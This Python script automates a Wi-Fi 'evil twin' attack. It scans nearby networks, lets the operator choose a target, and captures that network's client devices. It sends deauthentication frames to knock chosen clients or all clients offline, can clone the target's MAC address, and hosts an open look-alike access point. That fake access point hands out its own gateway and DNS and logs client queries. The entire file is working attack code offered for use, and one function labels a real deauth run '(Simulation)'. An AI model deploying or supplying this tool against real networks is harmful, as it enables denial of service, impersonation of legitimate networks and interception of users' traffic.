
#!/usr/bin/env python3

import os
import subprocess
import time
import csv
import glob
import sys
import signal
import shutil


# Physical interface name (usually wlan0)
PHY_INTERFACE = "wlan0" 
FAKE_IP = "10.0.0.1"
DHCP_RANGE = "10.0.0.10,10.0.0.50,12h"
SCAN_PREFIX = "target_scan"

class FakeAP:
    def __init__(self):
        self.target_ssid = None
        self.target_channel = None
        self.target_bssid = None
        self.mon_interface = None
        self.hostapd_proc = None
        self.dnsmasq_proc = None

    def check_root(self):
        if os.geteuid() != 0:
            print("[!] Must run as root (sudo).")
            sys.exit(1)

    def check_tools(self):
        required = ["hostapd", "dnsmasq", "airmon-ng", "airodump-ng", "macchanger"]
        missing = [t for t in required if not shutil.which(t)]
        if missing:
            print(f"[!] Missing tools: {', '.join(missing)}")
            print("Install them: sudo apt install hostapd dnsmasq aircrack-ng")
            sys.exit(1)

#First we scan for available networks to check which network to copy
    def start_monitor_mode(self):
        print("[*] Enabling Monitor Mode for scanning...")
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Start airmon-ng
        subprocess.run(["airmon-ng", "start", PHY_INTERFACE], capture_output=True, text=True)
        
        # Detect the new monitor interface name (usually wlan0mon)
        self.mon_interface = PHY_INTERFACE + "mon"
        
        # Verify it exists, otherwise assume it stayed as wlan0
        if not os.path.exists(f"/sys/class/net/{self.mon_interface}"):
            self.mon_interface = PHY_INTERFACE

        print(f"[+] Monitor interface active: {self.mon_interface}")
    
    def should_mac_spoof(self):  # ADD THIS METHOD
        """Ask user if they want to spoof MAC address"""
        response = input("\n[?] Spoof MAC address to match target BSSID? (y/N): ").strip().lower()
        return response == 'y'    
    
    def spoof_mac(self, target_bssid):
        """Clone the target AP's MAC address"""
        print(f"[*] Spoofing MAC address to {target_bssid}")
        subprocess.run(["ifconfig", PHY_INTERFACE, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["macchanger", "-m", target_bssid, PHY_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ifconfig", PHY_INTERFACE, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def scan_for_targets(self):
        # Cleanup old scans
        for f in glob.glob(f"{SCAN_PREFIX}*"):
            try: os.remove(f)
            except: pass

        print("[*] Scanning for 10 seconds...")
        cmd = [
            "airodump-ng", self.mon_interface,
            "--write", SCAN_PREFIX,
            "--output-format", "csv"
        ]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            proc.terminate()
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()

    def select_target(self):
        files = glob.glob(f"{SCAN_PREFIX}-*.csv")
        if not files:
            print("[-] No scan data found.")
            return False
            
        latest_csv = max(files, key=os.path.getmtime)
        networks = []

        with open(latest_csv, newline='', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() in ["BSSID", "Station MAC", ""]: continue
                
                ssid = row[13].strip()
                if not ssid: continue

                networks.append({
                    "bssid": row[0].strip(),
                    "channel": row[3].strip(),
                    "enc": row[5].strip(),
                    "essid": ssid
                })

        if not networks:
            print("[-] No networks found.")
            return False

        print("\nID  CH   SSID")
        print("--  ---  --------------------")
        for i, net in enumerate(networks):
            print(f"{i:<3} {net['channel']:<4} {net['essid']}")

        while True:
            try:
                sel = input("\n[?] Select target ID: ")
                idx = int(sel)
                if 0 <= idx < len(networks):
                    target = networks[idx]
                    self.target_ssid = target['essid']
                    self.target_channel = target['channel']
                    self.target_bssid = target['bssid']
                    return True
            except ValueError:
                pass
            print("Invalid selection.")

#Switch from Monitor mode to managed mode to allow for hosting of fake AP
    def stop_monitor_mode(self):
        """Stops monitor mode to free the card for Hostapd."""
        print("\n[*] Stopping Monitor Mode...")
        subprocess.run(["airmon-ng", "stop", self.mon_interface], stdout=subprocess.DEVNULL)
        
        # Restart network manager sometimes interferes, so we kill it again just in case
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Ensure phy interface is back
        time.sleep(2)
        print(f"[+] Reverted to managed mode on {PHY_INTERFACE}")

# Hosting the Fake AP , so devices can connect, 
    def create_configs(self):
        print("[*] Generating hostapd config...")
        
        hostapd_conf = f"""
        interface={PHY_INTERFACE}
        driver=nl80211
        ssid={self.target_ssid}
        hw_mode=g
        channel={self.target_channel}
        macaddr_acl=0
        auth_algs=1
        ignore_broadcast_ssid=0
        """
        with open("hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"""
        interface={PHY_INTERFACE}
        dhcp-range={DHCP_RANGE}
        dhcp-option=3,{FAKE_IP}
        dhcp-option=6,{FAKE_IP}
        server=8.8.8.8
        log-queries
        log-dhcp
        """
        with open("dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

    def setup_networking(self):
        # Set IP for the interface
        print(f"[*] Setting gateway IP {FAKE_IP}...")
        subprocess.run(["ifconfig", PHY_INTERFACE, FAKE_IP, "netmask", "255.255.255.0", "up"])
        # Enable forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def start_services(self):
        print("[+] Starting DNSMASQ...")
        self.dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", "dnsmasq.conf", "-d"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE
        )

        print("[+] Starting HOSTAPD (Fake AP)...")
        print(f"\n[!] EVIL TWIN LIVE: '{self.target_ssid}' on Channel {self.target_channel}")
        print("[!] Logs (Connections will appear below):\n")
        
        # Piping stdout to console so user sees connections
        self.hostapd_proc = subprocess.Popen(
            ["hostapd", "hostapd.conf"],
            stdout=sys.stdout,
            stderr=sys.stderr
        )

        try:
            self.hostapd_proc.wait()
        except KeyboardInterrupt:
            pass

    def cleanup(self):
        print("\n[*] Shutting down...")
        if self.hostapd_proc: self.hostapd_proc.terminate()
        if self.dnsmasq_proc: self.dnsmasq_proc.terminate()
        
        # Remove configs
        if os.path.exists("hostapd.conf"): os.remove("hostapd.conf")
        if os.path.exists("dnsmasq.conf"): os.remove("dnsmasq.conf")
        
        # Reset IP
        subprocess.run(["ifconfig", PHY_INTERFACE, "0.0.0.0"])
        print("[+] Done.")
            
    def run_airodump_for_clients(self, mon_iface, channel, bssid, duration=15, prefix="clients"):
        
        # Run airodump-ng focused on a specific AP (BSSID + channel)
        # to capture client stations into a CSV.
        
        print(f"[+] Running airodump-ng on {mon_iface} (CH: {channel}, BSSID: {bssid}) for {duration} seconds (clients)...")
        proc = subprocess.Popen(
            [
                "sudo", "airodump-ng", mon_iface,
                "-c", channel,
                "--bssid", bssid,
                "--write", prefix,
                "--output-format", "csv"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(duration)
        proc.terminate()
        proc.wait()
        print("[+] Client capture finished, clients CSV should be created")

    def get_latest_scan_csv(self, prefix="scan"):
        pattern = f"{prefix}-*.csv"
        files = glob.glob(pattern)
        if not files:
            return None
        latest = max(files, key=os.path.getmtime)
        return latest

    def parse_clients_from_csv(self, csv_file, target_bssid):
        clients = []
        with open(csv_file, newline='') as f:
            reader = csv.reader(f)
            in_client_section = False

            for row in reader:
                if not row:
                    continue

                first = row[0].strip()
                if first == "Station MAC":
                    in_client_section = True
                    continue

                if not in_client_section:
                    continue

                if first == "":
                    continue 

                # Expected columns in station rows:
                # 0: Station MAC
                # 5: BSSID (AP)
                station_mac = row[0].strip()
                bssid       = row[5].strip()

                if bssid.lower() != target_bssid.lower():
                    continue

                power   = row[3].strip() if len(row) > 3 else ""
                packets = row[4].strip() if len(row) > 4 else ""

                clients.append({
                    "mac": station_mac,
                    "bssid": bssid,
                    "power": power,
                    "packets": packets,
                })

        return clients

    def choose_clients(self, clients):
        
        if not clients:
            print("No clients found for this network.")
            return []

        print("\nID  POWER  PACKETS  CLIENT MAC")
        print("--  -----  -------  -----------------")
        for i, c in enumerate(clients):
            print(f"{i:2}  {c['power']:>5}  {c['packets']:>7}  {c['mac']}")

        print("\nEnter one or more IDs separated by spaces or commas:")
        while True:
            raw = input("Client IDs: ").strip()
            if not raw:
                print("Please enter at least one ID.")
                continue

            # Allow "0 1 2" or "0,1,2"
            raw_ids = raw.replace(",", " ").split()
            indices = []
            ok = True
            for r in raw_ids:
                if not r.isdigit():
                    print(f"'{r}' is not a valid number.")
                    ok = False
                    break
                idx = int(r)
                if not (0 <= idx < len(clients)):
                    print(f"ID {idx} is out of range.")
                    ok = False
                    break
                indices.append(idx)

            if not ok:
                continue

            seen = set()
            result = []
            for idx in indices:
                if idx not in seen:
                    seen.add(idx)
                    result.append(clients[idx])

            return result
        
                
    #deauthentication
    def disconnect_specific_devices(self, selected_network, mon_iface="wlan0mon"):
    
        bssid = selected_network["bssid"]
        channel = selected_network["channel"]

        # Capture clients on this BSSID+channel
        self.run_airodump_for_clients(mon_iface, channel, bssid, duration=15, prefix="clients")

        # Find latest clients CSV
        csv_file = self.get_latest_scan_csv("clients")
        if not csv_file:
            print("[-] No clients CSV found. Did airodump-ng run correctly?")
            return

        print(f"[+] Using clients CSV file: {csv_file}")

        # 3) Parse clients
        clients = self.parse_clients_from_csv(csv_file, target_bssid=bssid)

        # 4) Let user choose one or more clients
        chosen_clients = self.choose_clients(clients)
        if not chosen_clients:
            print("[-] No clients selected.")
            return

        print("\n[+] You selected these client(s):")
        for c in chosen_clients:
            print(f"    {c['mac']} (BSSID: {c['bssid']}, POWER: {c['power']}, PACKETS: {c['packets']})")

        number_of_packets = "15"  # Should be string for subprocess

        for c in chosen_clients: 
            subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", number_of_packets,
                "-a", bssid, "-c", c["mac"], mon_iface],  # Use 'c' directly, not chosen_clients[c]
                check=True
            )  
        print("Disconnect attack was sucessful")  


    def disconnect_all_devices(self, selected_network, mon_iface="wlan0mon"):
        
        bssid = selected_network["bssid"]
        channel = selected_network["channel"]
        essid = selected_network["essid"]
        number_of_packets = '50'

        print("\n[+] (Simulation) You chose to affect ALL clients on:")
        print(f"    ESSID : {essid}")
        print(f"    BSSID : {bssid}")
        print(f"    CH    : {channel}")

        
        subprocess.run(["sudo", "iwconfig", "wlan0mon", "channel", selected_network['channel']])

        try:
            result = subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", number_of_packets,
                "-a", bssid, mon_iface],
                check=True,
                capture_output=True,   
                text=True              
            )
            print("[+] Command succeeded")
            print("STDOUT:\n", result.stdout)

        except subprocess.CalledProcessError as e:
            print("[-] Command failed with code:", e.returncode)
            print("STDOUT:\n", e.stdout)
            print("STDERR:\n", e.stderr) 
            
    def run(self):
            self.check_root()
            self.check_tools()
            
            try:
                # 1. Recon phase (find target)
                self.reconnaissance_phase()
                
                # 2. Deauth phase (optional)
                self.deauth_phase()
                
                # 3. Evil Twin phase
                self.evil_twin_phase()
                
            except Exception as e:
                print(f"\n[!] Error: {e}")
            finally:
                self.cleanup()
                
    def reconnaissance_phase(self):
            """Phase 1: Find target network"""
            print("\n" + "="*50)
            print("PHASE 1: RECONNAISSANCE")
            print("="*50)
            
            self.start_monitor_mode()
            
            # Use existing scan method OR your custom one
            self.scan_for_targets()  # Uses the script's existing method
            if not self.select_target():  # Uses existing method
                print("[-] No target selected")
                self.stop_monitor_mode()
                return False
            
            return True

    def deauth_phase(self):
        """Phase 2: Deauth attacks"""
        print("\n" + "="*50)
        print("PHASE 2: DEAUTHENTICATION ATTACK")
        print("="*50)
        
        print("\nPlease choose deauth strategy:")
        print("  1) Disconnect specific devices")
        print("  2) Disconnect all devices")
        print("  3) Skip deauth")
        
        choice = input("Choose [1/2/3]: ").strip()
        
        if choice == "1":
            target_info = {
                'essid': self.target_ssid,
                'bssid': self.target_bssid,
                'channel': self.target_channel
            }
            self.disconnect_specific_devices(target_info, mon_iface=self.mon_interface)
        elif choice == "2":
            target_info = {
                'essid': self.target_ssid,
                'bssid': self.target_bssid,
                'channel': self.target_channel
            }
            self.disconnect_all_devices(target_info, mon_iface=self.mon_interface)
        
        return choice != "3"  # Return True if deauth was performed

    def evil_twin_phase(self):
        """Phase 3: Set up Evil Twin"""
        print("\n" + "="*50)
        print("PHASE 3: EVIL TWIN DEPLOYMENT")
        print("="*50)
        
        self.stop_monitor_mode()
        if self.should_mac_spoof():
            self.spoof_mac(self.target_bssid)
        self.create_configs()
        self.setup_networking()
        self.start_services()

if __name__ == "__main__":
    FakeAP().run()
